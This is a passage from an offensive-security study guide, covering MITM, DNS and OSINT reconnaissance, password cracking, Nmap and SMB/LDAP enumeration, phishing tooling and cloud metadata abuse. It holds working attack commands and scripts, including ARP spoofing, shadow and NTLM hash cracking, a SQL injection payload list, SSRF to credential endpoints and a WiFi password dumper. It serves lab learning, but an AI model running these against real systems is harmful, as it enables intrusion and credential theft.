### 4.3 Common Ports & Services

```
Port    Protocol  Service           Attack Vectors
20/21   TCP       FTP               Anonymous login, clear-text creds, bounce attacks
22      TCP       SSH               Brute force, key reuse, weak algorithms
23      TCP       Telnet            Clear-text sniffing, brute force
25      TCP       SMTP              Open relay, user enumeration, phishing
53      TCP/UDP   DNS               Zone transfer, DNS cache poisoning, tunnel
67/68   UDP       DHCP              DHCP starvation, rogue DHCP
80      TCP       HTTP              Web attacks (all of them)
88      TCP       Kerberos          Pass-the-ticket, AS-REP roasting, Kerberoasting
110     TCP       POP3              Clear-text credentials
111     TCP/UDP   RPC               portmapper exploitation
135     TCP       MS-RPC            DCOM exploitation, lateral movement
137-139 TCP/UDP   NetBIOS           SMB relay, null sessions
143     TCP       IMAP              Clear-text creds
161/162 UDP       SNMP              Community string sniffing, info disclosure
389     TCP       LDAP              Null bind, user enumeration, AD queries
443     TCP       HTTPS             Web attacks + SSL misconfigs
445     TCP       SMB               EternalBlue, Pass-the-Hash, SMB relay
500     UDP       IKE (VPN)         VPN attacks
636     TCP       LDAPS             LDAP over SSL
1433    TCP       MSSQL             SA login, xp_cmdshell, linked servers
1521    TCP       Oracle DB         Default creds, TNS poisoning
3306    TCP       MySQL             Weak creds, SQL injection
3389    TCP       RDP               BlueKeep, brute force, pass-the-hash
4444    TCP       Metasploit        Default reverse shell port (attacker)
5432    TCP       PostgreSQL        Weak creds, SQL injection
5985    TCP       WinRM HTTP        Evil-WinRM, remote PS execution
5986    TCP       WinRM HTTPS       Same as above over SSL
6379    TCP       Redis             No-auth configs, RCE via config write
8080    TCP       HTTP-Alt          Web attacks, dev servers often here
8443    TCP       HTTPS-Alt         Alternative HTTPS
27017   TCP       MongoDB           No-auth configs, data exfiltration
```

### 4.4 ARP Spoofing — Man-in-the-Middle

```
Normal ARP:
Host A (192.168.1.10) wants to talk to Gateway (192.168.1.1)
Host A broadcasts: "Who has 192.168.1.1?"
Gateway responds: "192.168.1.1 is at AA:BB:CC:DD:EE:FF"
Host A caches this and sends traffic to Gateway

ARP Spoofing (MITM):
Attacker sends unsolicited ARP:
"192.168.1.1 is at ATTACKER:MAC" → to Host A
"192.168.1.10 is at ATTACKER:MAC" → to Gateway
Now ALL traffic flows through attacker!
```

```bash
# ARP Spoofing with arpspoof (lab only - ethical!)
# Enable IP forwarding first (so traffic still reaches destination)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Poison ARP cache of victim (tell victim: gateway is attacker)
sudo arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP &

# Poison ARP cache of gateway (tell gateway: victim is attacker)
sudo arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP &

# Now capture traffic with Wireshark or tcpdump
sudo tcpdump -i eth0 -w capture.pcap

# Use Ettercap for automated MITM
sudo ettercap -T -q -i eth0 -M arp:remote /VICTIM_IP// /GATEWAY_IP//

# Bettercap (modern tool — more powerful)
sudo bettercap -iface eth0
# Inside bettercap console:
# net.probe on
# net.recon on
# arp.spoof.targets 192.168.1.10
# arp.spoof on
# net.sniff on

# Stop attack (restore ARP tables)
# Ctrl+C arpspoof processes
# Send correct ARP replies
sudo arp -s VICTIM_IP VICTIM_REAL_MAC
```

### 4.5 DNS — Attacks & Techniques

```bash
# DNS Enumeration
dig google.com ANY                # All records
dig google.com A                  # IPv4 address
dig google.com AAAA               # IPv6 address
dig google.com MX                 # Mail servers
dig google.com NS                 # Name servers
dig google.com TXT                # Text records (SPF, DKIM, etc.)
dig google.com SOA                # Start of Authority
dig -x 8.8.8.8                   # Reverse DNS lookup
nslookup -type=ANY google.com     # Windows equivalent

# DNS Zone Transfer (if misconfigured — reveals all DNS records!)
dig @ns1.target.com target.com AXFR
host -t axfr target.com ns1.target.com
dnsrecon -d target.com -t axfr

# Subdomain enumeration
# Using wordlist brute force
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Using dnsrecon
dnsrecon -d target.com -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# DNS Cache Poisoning (conceptual — for lab)
# Requires specific conditions: no DNSSEC, race condition
# Tool: dnsspoof (very old attack, modern DNS mostly patched)

# DNS Tunneling (data exfiltration over DNS)
# Tool: dnscat2 or iodine
# Useful to bypass firewalls that only allow port 53

# Hosts file manipulation (on compromised machine)
# Windows: C:\Windows\System32\drivers\etc\hosts
# Linux: /etc/hosts
echo "192.168.1.100 payroll.company.com" >> /etc/hosts

# Practice with your own domain/DNS server
# Set up BIND9 on Ubuntu:
sudo apt install bind9 -y
# Configure zones in /etc/bind/named.conf.local
```

### 4.6 Wireshark & Traffic Analysis

```bash
# Capture traffic
sudo wireshark &                           # GUI
sudo tcpdump -i eth0 -w capture.pcap      # CLI capture
sudo tcpdump -i eth0 port 80              # Filter by port
sudo tcpdump -i eth0 host 192.168.1.10   # Filter by host
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'  # SYN packets only

# Analyze capture
tcpdump -r capture.pcap                   # Read from file
tcpdump -r capture.pcap -A | head -100   # ASCII output

# Wireshark filters (display filters):
# http                    — HTTP traffic
# http.request.method == "POST"  — POST requests
# tcp.port == 445         — SMB traffic
# ip.addr == 192.168.1.10 — Specific host
# !(arp or dns or icmp)   — Exclude noise
# http contains "password" — Search for string
# tcp.flags.syn == 1 && tcp.flags.ack == 0  — SYN scans

# Extract credentials from PCAP
sudo strings capture.pcap | grep -i "pass\|user\|login\|auth"
# Or use NetworkMiner (Windows tool)

# Analyze HTTP traffic
tshark -r capture.pcap -Y http -T fields -e http.request.method -e http.request.uri -e http.file_data 2>/dev/null

# Follow TCP streams in Wireshark: Right-click packet → Follow → TCP Stream
```

---

## 5. Cryptography

### 5.1 Hashing — Practical Guide

```bash
# Generate hashes (Linux)
echo -n "password123" | md5sum          # MD5 (weak, deprecated)
echo -n "password123" | sha1sum         # SHA1 (weak)
echo -n "password123" | sha256sum       # SHA256 (good)
echo -n "password123" | sha512sum       # SHA512 (strong)

# File hashing (integrity checking)
md5sum important_file.txt
sha256sum important_file.txt

# Python hashing
python3 -c "
import hashlib
password = 'password123'
print('MD5:   ', hashlib.md5(password.encode()).hexdigest())
print('SHA1:  ', hashlib.sha1(password.encode()).hexdigest())
print('SHA256:', hashlib.sha256(password.encode()).hexdigest())
print('SHA512:', hashlib.sha512(password.encode()).hexdigest())
"

# Windows PowerShell
Get-FileHash file.txt -Algorithm MD5
Get-FileHash file.txt -Algorithm SHA256
Get-FileHash file.txt -Algorithm SHA512

# Identify hash type (using hashid or hash-identifier)
hash-identifier
# or
hashid 5f4dcc3b5aa765d61d8327deb882cf99

# Common hash formats:
# MD5:    32 hex chars         5f4dcc3b5aa765d61d8327deb882cf99
# SHA1:   40 hex chars         5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
# SHA256: 64 hex chars         (64 characters)
# SHA512: 128 hex chars        (128 characters)
# NTLM:   32 hex chars         (same length as MD5, different format)
# bcrypt: $2a$10$... or $2b$   (contains $ separators)
# SHA512crypt: $6$...          (Linux /etc/shadow)
```

### 5.2 Password Cracking

```bash
# ─── JOHN THE RIPPER ───────────────────────────────────────────

# Crack /etc/shadow
sudo unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Crack specific hash type
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
john hash.txt --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt

# Crack NTLM hashes (Windows)
echo "Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::" > ntlm.txt
john ntlm.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt

# Rules-based cracking (mutate words)
john hash.txt --wordlist=wordlist.txt --rules=All

# Show cracked passwords
john --show hash.txt

# Resume interrupted session
john --restore

# ─── HASHCAT (GPU-ACCELERATED) ─────────────────────────────────

# Hash modes reference:
# 0    = MD5
# 100  = SHA1
# 1400 = SHA256
# 1800 = SHA512crypt ($6$) — Linux shadow
# 1000 = NTLM — Windows passwords
# 3000 = LM — very old Windows
# 5600 = NetNTLMv2 — captured from network
# 13100 = Kerberoast hash
# 1500 = DES(unix) — older Linux

# Dictionary attack
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Brute force (all 4-char passwords)
hashcat -m 0 -a 3 hash.txt ?a?a?a?a

# Combination attack (combine two wordlists)
hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt

# Rule-based attack (most powerful)
hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Crack NTLM (Windows)
hashcat -m 1000 ntlm_hashes.txt rockyou.txt

# Crack NetNTLMv2 (from Responder)
hashcat -m 5600 netntlm.txt rockyou.txt

# Mask attack (targeted brute force)
# ?l = lowercase, ?u = uppercase, ?d = digit, ?s = special, ?a = all
hashcat -m 0 -a 3 hash.txt ?u?l?l?l?d?d?d?s   # Pattern: Passw0rd!

# Show cracked
hashcat -m 0 hash.txt --show
```

### 5.3 Symmetric & Asymmetric Encryption — Practical

```bash
# ─── OpenSSL (Symmetric) ───────────────────────────────────────

# Encrypt file with AES-256
openssl enc -aes-256-cbc -salt -in plaintext.txt -out encrypted.bin -k "MyPassword"

# Decrypt
openssl enc -aes-256-cbc -d -in encrypted.bin -out decrypted.txt -k "MyPassword"

# ─── OpenSSL (Asymmetric RSA) ──────────────────────────────────

# Generate RSA key pair
openssl genrsa -out private.key 4096         # Generate private key
openssl rsa -in private.key -pubout -out public.key  # Extract public key

# Encrypt with public key
openssl rsautl -encrypt -inkey public.key -pubin -in plaintext.txt -out encrypted.bin

# Decrypt with private key
openssl rsautl -decrypt -inkey private.key -in encrypted.bin -out decrypted.txt

# ─── SSH Key Generation ────────────────────────────────────────

# Generate ED25519 key (modern, recommended)
ssh-keygen -t ed25519 -C "lab@kali" -f ~/.ssh/lab_key

# Generate RSA key
ssh-keygen -t rsa -b 4096 -C "lab@kali" -f ~/.ssh/lab_rsa

# Copy public key to target for passwordless login
ssh-copy-id -i ~/.ssh/lab_key.pub user@target_ip

# Connect using key
ssh -i ~/.ssh/lab_key user@target_ip

# ─── GPG (GNU Privacy Guard) ───────────────────────────────────

# Generate GPG key pair
gpg --gen-key

# Export public key
gpg --export --armor "user@email.com" > public.asc

# Encrypt file
gpg --encrypt --recipient "user@email.com" file.txt

# Decrypt
gpg --decrypt file.txt.gpg > decrypted.txt
```

---

## 6. Scripting & Automation

### 6.1 Bash Scripting for Security

```bash
#!/bin/bash
# ─── Port Scanner Script ────────────────────────────────────────

#!/bin/bash
# Simple TCP port scanner
# Usage: ./portscan.sh 192.168.1.1 1 1000

TARGET=$1
START_PORT=$2
END_PORT=$3

echo "[*] Scanning $TARGET ports $START_PORT-$END_PORT"
echo "========================================"

for port in $(seq $START_PORT $END_PORT); do
    (echo >/dev/tcp/$TARGET/$port) 2>/dev/null && \
    echo "[+] Port $port is OPEN"
done

echo "[*] Scan complete"
```

```bash
#!/bin/bash
# ─── Network Alive Scanner ─────────────────────────────────────

#!/bin/bash
# Ping sweep to find alive hosts
NETWORK="192.168.1"

echo "[*] Scanning $NETWORK.0/24"
for i in $(seq 1 254); do
    host="$NETWORK.$i"
    ping -c 1 -W 1 $host &>/dev/null && echo "[+] $host is ALIVE" &
done
wait
echo "[*] Done"
```

```bash
#!/bin/bash
# ─── Log File Analyzer for Suspicious Activity ─────────────────

#!/bin/bash
LOG="/var/log/auth.log"

echo "=== Failed SSH Login Attempts ==="
grep "Failed password" $LOG | \
    awk '{print $(NF-3)}' | \
    sort | \
    uniq -c | \
    sort -rn | \
    head -20

echo ""
echo "=== Top 10 Source IPs Attempting Login ==="
grep "Failed password" $LOG | \
    grep -oP '(?<=from )\S+' | \
    sort | \
    uniq -c | \
    sort -rn | \
    head -10

echo ""
echo "=== Successful Logins ==="
grep "Accepted password\|Accepted publickey" $LOG | \
    awk '{print $1,$2,$3,$9,$11}' | \
    tail -20
```

### 6.2 Python for Hacking

```python
#!/usr/bin/env python3
# ─── Port Scanner ──────────────────────────────────────────────

import socket
import threading
from datetime import datetime

def scan_port(ip, port, open_ports):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((ip, port))
        if result == 0:
            try:
                banner = s.recv(1024).decode().strip()
            except:
                banner = ""
            open_ports.append((port, banner))
        s.close()
    except:
        pass

def scan(target, start_port=1, end_port=1000):
    print(f"\n[*] Scanning {target}")
    print(f"[*] Started at: {datetime.now()}")
    print("-" * 50)

    open_ports = []
    threads = []

    for port in range(start_port, end_port + 1):
        t = threading.Thread(target=scan_port, args=(target, port, open_ports))
        threads.append(t)
        t.start()

        # Limit concurrent threads
        if len(threads) >= 100:
            for thread in threads:
                thread.join()
            threads = []

    for thread in threads:
        thread.join()

    open_ports.sort(key=lambda x: x[0])
    for port, banner in open_ports:
        print(f"[+] Port {port:5d}/tcp  OPEN  {banner[:50] if banner else ''}")

    print(f"\n[*] Finished at: {datetime.now()}")

if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    scan(target, 1, 1000)
```

```python
#!/usr/bin/env python3
# ─── HTTP Directory Brute Forcer ───────────────────────────────

import requests
import sys
from threading import Thread
from queue import Queue

def check_path(target, path, results, status_filter):
    try:
        url = f"{target.rstrip('/')}/{path.strip()}"
        response = requests.get(url, timeout=5, allow_redirects=False,
                               headers={"User-Agent": "Mozilla/5.0"})
        if response.status_code not in [404]:
            results.append((response.status_code, url))
            print(f"[{response.status_code}] {url}")
    except:
        pass

def brute_force(target, wordlist_path, threads=50):
    print(f"[*] Target: {target}")
    print(f"[*] Wordlist: {wordlist_path}")

    with open(wordlist_path, 'r', errors='ignore') as f:
        paths = f.readlines()

    print(f"[*] Testing {len(paths)} paths with {threads} threads")
    print("-" * 60)

    results = []
    q = Queue()

    for path in paths:
        q.put(path)

    def worker():
        while not q.empty():
            path = q.get()
            check_path(target, path, results, [200, 301, 302, 403])
            q.task_done()

    thread_list = []
    for _ in range(threads):
        t = Thread(target=worker)
        t.daemon = True
        t.start()
        thread_list.append(t)

    q.join()

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://target.com"
    wordlist = sys.argv[2] if len(sys.argv) > 2 else "/usr/share/seclists/Discovery/Web-Content/common.txt"
    brute_force(target, wordlist)
```

```python
#!/usr/bin/env python3
# ─── Basic SQL Injection Tester ────────────────────────────────
# Use only on YOUR OWN web applications!

import requests
import sys

# Common SQL injection payloads
SQL_PAYLOADS = [
    "'",
    "''",
    "`",
    "``",
    ",",
    '"',
    '""',
    "/",
    "//",
    "\\",
    "\\\\",
    ";",
    "' or '1'='1",
    "' or '1'='1'--",
    "' or '1'='1'/*",
    "' or 1=1--",
    "' or 1=1#",
    '" or 1=1--',
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
]

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate",
    "ora-",
    "pg_",
    "microsoft sql",
    "sqlite",
    "syntax error"
]

def test_sqli(url, param):
    print(f"[*] Testing SQLi on: {url}")
    print(f"[*] Parameter: {param}")
    print("-" * 60)

    # Baseline request
    baseline = requests.get(url, params={param: "test"}, timeout=10)

    for payload in SQL_PAYLOADS:
        try:
            params = {param: payload}
            response = requests.get(url, params=params, timeout=10)

            # Check for SQL errors in response
            for error in SQL_ERRORS:
                if error in response.text.lower():
                    print(f"[!] POTENTIAL SQLi with payload: {payload}")
                    print(f"    Error found: {error}")
                    break

            # Check for significant response size change
            size_diff = abs(len(response.text) - len(baseline.text))
            if size_diff > 200:
                print(f"[?] Response size change ({size_diff} bytes) with: {payload}")

        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    # ONLY test on your own web applications!
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/dvwa/vulnerabilities/sqli/"
    param = sys.argv[2] if len(sys.argv) > 2 else "id"
    test_sqli(url, param)
```

### 6.3 PowerShell for Offense & Defense

```powershell
# ─── Enumeration Script ────────────────────────────────────────

# System Information
$info = @{
    "Hostname"     = $env:COMPUTERNAME
    "Username"     = $env:USERNAME
    "Domain"       = $env:USERDOMAIN
    "OS"           = (Get-WmiObject Win32_OperatingSystem).Caption
    "Architecture" = $env:PROCESSOR_ARCHITECTURE
    "IP Addresses" = (Get-NetIPAddress | Where-Object {$_.AddressFamily -eq "IPv4"} | Select-Object -ExpandProperty IPAddress) -join ", "
}

Write-Host "=== SYSTEM INFORMATION ===" -ForegroundColor Green
$info.GetEnumerator() | Format-Table -AutoSize

# Running Processes
Write-Host "`n=== INTERESTING PROCESSES ===" -ForegroundColor Yellow
Get-Process | Where-Object {
    $_.Name -match "antivirus|defender|firewall|norton|mcafee|kaspersky|avast|avg|carbon|cylance|sentinel|crowdstrike"
} | Select-Object Name, Id, Path | Format-Table

# Network Connections
Write-Host "`n=== ACTIVE CONNECTIONS ===" -ForegroundColor Yellow
netstat -ano | Where-Object {$_ -match "ESTABLISHED"}

# Local Users
Write-Host "`n=== LOCAL USERS ===" -ForegroundColor Yellow
Get-LocalUser | Select-Object Name, Enabled, PasswordExpires, LastLogon | Format-Table

# Local Admins
Write-Host "`n=== LOCAL ADMINISTRATORS ===" -ForegroundColor Yellow
Get-LocalGroupMember -Group "Administrators" | Format-Table

# Installed Software
Write-Host "`n=== INSTALLED SOFTWARE ===" -ForegroundColor Yellow
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, DisplayVersion, Publisher |
    Where-Object {$_.DisplayName -ne $null} |
    Sort-Object DisplayName |
    Format-Table -AutoSize

# Scheduled Tasks (suspicious ones)
Write-Host "`n=== SCHEDULED TASKS ===" -ForegroundColor Yellow
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} |
    Select-Object TaskName, TaskPath | Format-Table

# PowerShell History
Write-Host "`n=== POWERSHELL HISTORY ===" -ForegroundColor Yellow
Get-Content (Get-PSReadLineOption).HistorySavePath 2>$null | Select-Object -Last 20

# Saved WiFi passwords
Write-Host "`n=== SAVED WIFI PASSWORDS ===" -ForegroundColor Yellow
netsh wlan show profiles | ForEach-Object {
    if ($_ -match "All User Profile\s+:\s+(.+)") {
        $profile = $matches[1]
        $pw = netsh wlan show profile name="$profile" key=clear 2>$null |
              Select-String "Key Content"
        if ($pw) { "$profile : $pw" }
    }
}
```

---

## 7. Virtualization & Cloud

### 7.1 Cloud Security Concepts

```
Cloud Attack Surface:

IaaS (AWS EC2, Azure VM):
- Exposed management ports (22, 3389)
- Weak IAM policies
- Publicly exposed S3 buckets / Azure Blobs
- Instance metadata service (IMDS) abuse
- Default credentials

PaaS (App Service, Elastic Beanstalk):
- Vulnerable web applications
- Misconfigured access controls

SaaS (Office 365, Salesforce):
- Credential attacks
- OAuth abuse
- Phishing for tokens

Common Cloud Misconfigs:
- S3 buckets set to public
- Security groups with 0.0.0.0/0 inbound
- Overly permissive IAM roles
- Disabled MFA on root/admin accounts
- Unencrypted data at rest
- No CloudTrail logging
- IMDSv1 enabled (SSRF → metadata → credentials)
```

```bash
# ─── AWS Security Testing (your own AWS account) ───────────────

# Install AWS CLI
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip && sudo ./aws/install

# Configure
aws configure

# Enumerate S3 buckets
aws s3 ls                                    # List your buckets
aws s3 ls s3://target-bucket                 # List bucket contents
aws s3 cp s3://target-bucket/file.txt ./     # Download file

# Check public bucket access (without credentials)
curl -s https://target-bucket.s3.amazonaws.com/  # May expose files

# IAM enumeration
aws iam get-user
aws iam list-users
aws iam list-roles
aws iam list-policies --scope Local
aws iam get-policy --policy-arn arn:aws:iam::ACCOUNT:policy/POLICY_NAME

# IMDS (Instance Metadata Service) — from inside EC2
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# SSRF to IMDS (from web vulnerability)
# If a web app is vulnerable to SSRF:
# curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role_name"
```

---

## 8. OSINT Techniques

### 8.1 Passive Reconnaissance

```bash
# ─── Domain & DNS Intelligence ─────────────────────────────────

# WHOIS information
whois target.com
whois 8.8.8.8  # Reverse WHOIS

# DNS records
dig target.com ANY
dig target.com MX
dig target.com NS
dig target.com TXT

# Zone transfer attempt
dig @ns1.target.com target.com AXFR

# Certificate Transparency (reveals subdomains)
# Visit: https://crt.sh/?q=%.target.com
curl -s "https://crt.sh/?q=%.target.com&output=json" | python3 -m json.tool | grep name_value | sort -u

# Subdomain enumeration tools
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -passive
assetfinder --subs-only target.com

# ─── Google Dorking ────────────────────────────────────────────

# Google Dorks (OSINT from search engines)
site:target.com                          # All indexed pages
site:target.com filetype:pdf             # PDF files
site:target.com inurl:admin              # Admin pages
site:target.com intitle:"index of"       # Directory listings
site:target.com intext:"sql syntax"      # SQL errors (vulnerable)
site:target.com filetype:env             # .env files (credentials!)
site:target.com filetype:sql             # SQL dumps
inurl:target.com intext:"password"       # Leaked passwords
site:pastebin.com "target.com"           # Pastes mentioning target
site:github.com "target.com" password   # GitHub leaks

# Shodan (internet-connected device search)
# shodan.io — create free account
# CLI:
shodan init YOUR_API_KEY
shodan search "hostname:target.com"
shodan search "org:TargetCompany" --fields ip_str,port,org
shodan host 8.8.8.8

# ─── Social Media & People Intelligence ────────────────────────

# Tools:
# theHarvester — emails, subdomains, IPs from public sources
theHarvester -d target.com -b all -l 500

# SpiderFoot — automated OSINT framework
# maltego — visual link analysis
# Recon-ng — modular web reconnaissance

# LinkedIn enumeration (for employee names → email format)
# Find email format: firstname.lastname@company.com?
# Tools: hunter.io, clearbit.com

# ─── Website Intelligence ──────────────────────────────────────

# Wayback Machine (cached old versions)
curl "https://archive.org/wayback/available?url=target.com"

# Technology fingerprinting
whatweb https://target.com
wappalyzer (browser extension)

# Web crawling
curl -s https://target.com | grep -oP 'href="[^"]+"' | sort -u

# robots.txt (often reveals hidden paths!)
curl https://target.com/robots.txt

# sitemap.xml
curl https://target.com/sitemap.xml
```

---

## 9. Social Engineering

### 9.1 Phishing Techniques (Educational)

```
Social Engineering Attack Types:

1. Phishing — Mass email attacks
2. Spear Phishing — Targeted email attacks
3. Vishing — Voice/phone attacks
4. Smishing — SMS attacks
5. Pretexting — Creating false scenarios
6. Baiting — USB drops, fake software
7. Quid Pro Quo — Offering service in exchange
8. Tailgating — Physical access behind authorized person

Psychological Principles Used:
- Authority (I'm from IT/HR/Management)
- Urgency ("Act NOW or lose access")
- Scarcity ("Limited time offer")
- Social proof ("Everyone is doing this")
- Liking (building rapport first)
- Reciprocity (giving something first)
- Fear (account suspended, legal action)
```

```bash
# ─── GoPhish (Legal phishing simulation framework) ─────────────

# Install GoPhish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish
./gophish &

# Access admin interface: https://localhost:3333
# Default creds: admin / gophish (change immediately)

# Setup:
# 1. Create Sending Profile (SMTP settings)
# 2. Create Email Template (phishing email)
# 3. Create Landing Page (credential capture page)
# 4. Create User & Groups (targets)
# 5. Launch Campaign
# 6. Track results in dashboard

# ─── SET (Social Engineering Toolkit) ────────────────────────

sudo setoolkit
# Menu-driven interface
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 2) Site Cloner
# Enter URL to clone: https://target.com/login

# ─── Email Header Analysis ─────────────────────────────────────

# Analyze received phishing email headers
# Look for:
# - Return-Path (actual sender)
# - X-Originating-IP
# - Received-SPF (PASS/FAIL)
# - DKIM-Signature validity
# - Authentication-Results

# Check SPF/DKIM/DMARC of a domain
dig target.com TXT         # SPF record
dig _dmarc.target.com TXT  # DMARC policy
dig mail._domainkey.target.com TXT  # DKIM key
```

---

## 10. Reconnaissance Phase

### 10.1 Active Reconnaissance with Nmap

```bash
# ─── NMAP — The Essential Tool ─────────────────────────────────

# Basic scans
nmap target.com                          # Default scan (top 1000 ports)
nmap -p- target.com                      # All 65535 ports (slow)
nmap -p 80,443,22,21 target.com         # Specific ports
nmap -p 1-1000 target.com               # Port range

# Scan types
nmap -sS target.com                      # SYN scan (stealth, requires root)
nmap -sT target.com                      # TCP connect scan (no root needed)
nmap -sU target.com                      # UDP scan (slow)
nmap -sA target.com                      # ACK scan (firewall mapping)
nmap -sN target.com                      # NULL scan (IDS evasion)
nmap -sX target.com                      # Xmas scan (IDS evasion)
nmap -sF target.com                      # FIN scan (IDS evasion)

# Version & OS detection
nmap -sV target.com                      # Service version detection
nmap -O target.com                       # OS detection (requires root)
nmap -A target.com                       # Aggressive (OS+version+script+traceroute)

# NSE Scripts (Nmap Scripting Engine)
nmap --script=vuln target.com           # Run vulnerability scripts
nmap --script=default target.com        # Default scripts
nmap --script=http-enum target.com      # Web directory enumeration
nmap --script=smb-vuln-ms17-010 target.com  # EternalBlue check
nmap --script=ftp-anon target.com -p 21     # Anonymous FTP check
nmap --script=ssh-brute target.com -p 22    # SSH brute force
nmap --script=http-sql-injection target.com # SQLi check

# Timing templates (IDS evasion vs speed)
nmap -T0 target.com  # Paranoid (very slow, max stealth)
nmap -T1 target.com  # Sneaky
nmap -T2 target.com  # Polite
nmap -T3 target.com  # Normal (default)
nmap -T4 target.com  # Aggressive (fast, louder)
nmap -T5 target.com  # Insane (fastest, very loud)

# Output formats
nmap target.com -oN scan.txt    # Normal output
nmap target.com -oX scan.xml    # XML output
nmap target.com -oG scan.gnmap  # Grepable output
nmap target.com -oA scan        # All formats simultaneously

# Scan entire subnet
nmap 192.168.1.0/24 -sn          # Ping scan (host discovery only)
nmap 192.168.1.0/24 -sV -p 80,443,22,445  # Service scan whole subnet

# Evade IDS/IPS/Firewalls
nmap target.com -D 10.0.0.1,10.0.0.2,ME     # Decoy scan
nmap target.com --source-port 53              # Spoof source port as DNS
nmap target.com -f                            # Fragment packets
nmap target.com --mtu 24                      # Custom MTU
nmap target.com --data-length 25             # Pad packets
nmap target.com --spoof-mac 0                # Random MAC address

# Lab: Complete scan of Metasploitable 2
nmap -sV -O -sC -p- 172.16.100.50 -oA metasploitable_scan
```

### 10.2 Web Application Reconnaissance

```bash
# ─── nikto (Web Server Scanner) ────────────────────────────────
nikto -h http://target.com
nikto -h http://target.com -output nikto_report.html -Format htm

# ─── Directory & File Discovery ────────────────────────────────

# gobuster
gobuster dir -u http://target.com \
    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
    -x php,html,txt,asp,aspx,jsp \
    -t 50 \
    -o gobuster_results.txt

# ffuf (fast, flexible)
ffuf -u http://target.com/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/common.txt \
    -c \
    -t 100 \
    -o ffuf_results.json

# Subdomain fuzzing with ffuf
ffuf -u http://FUZZ.target.com \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -H "Host: FUZZ.target.com" \
    -c

# dirsearch
python3 /opt/dirsearch/dirsearch.py -u http://target.com -e php,html,txt

# ─── Fingerprinting ────────────────────────────────────────────

# WhatWeb
whatweb -v http://target.com

# Curl for headers
curl -I http://target.com

# SSL/TLS analysis
sslscan target.com:443
testssl.sh target.com
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -text

# Get all links from a page
curl -s http://target.com | grep -oP 'href="[^"]+"' | sort -u

# robots.txt and sitemap
curl http://target.com/robots.txt
curl http://target.com/sitemap.xml
```

---

## 11. Scanning & Enumeration

### 11.1 SMB Enumeration

```bash
# SMB (port 139/445) is one of the most fruitful attack surfaces

# Null session (anonymous access — common on older systems)
smbclient -L //target_ip -N

# Enumerate shares
smbclient -L //target_ip -U username
smbclient //target_ip/share_name -U username

# enum4linux (comprehensive SMB enumeration)
enum4linux -a target_ip
enum4linux -U target_ip   # Users
enum4linux -S target_ip   # Shares
enum4linux -P target_ip   # Password policy
enum4linux -G target_ip   # Groups

# Nmap SMB scripts
nmap --script=smb-enum-shares,smb-enum-users target_ip -p 445
nmap --script=smb-vuln-ms17-010 target_ip -p 445  # EternalBlue
nmap --script=smb-security-mode target_ip -p 445
nmap --script=smb2-security-mode target_ip -p 445

# CrackMapExec (CME) — versatile SMB tool
crackmapexec smb target_ip
crackmapexec smb target_ip -u '' -p '' --shares   # Null session
crackmapexec smb target_ip -u user -p 'password' --shares
crackmapexec smb 192.168.1.0/24 -u user -p 'password'  # Spray subnet

# Mount SMB share
sudo mkdir /mnt/smb
sudo mount -t cifs //target_ip/sharename /mnt/smb -o username=user,password=pass

# smbmap (map permissions on shares)
smbmap -H target_ip
smbmap -H target_ip -u user -p password
```

### 11.2 LDAP / Active Directory Enumeration

```bash
# LDAP enumeration (port 389)
ldapsearch -H ldap://dc_ip -x -b "DC=domain,DC=local"   # Anonymous

# With credentials
ldapsearch -H ldap://dc_ip -x -D "user@domain.local" -w "password" \
    -b "DC=domain,DC=local" "(objectClass=user)"

# Get all users
ldapsearch -H ldap://dc_ip -x -D "user@domain.local" -w "password" \
    -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName

# Get all computers
ldapsearch -H ldap://dc_ip -x -D "user@domain.local" -w "password" \
    -b "DC=domain,DC=local" "(objectClass=computer)"

# Get all groups
ldapsearch -H ldap://dc_ip -x -D "user@domain.local" -w "password" \
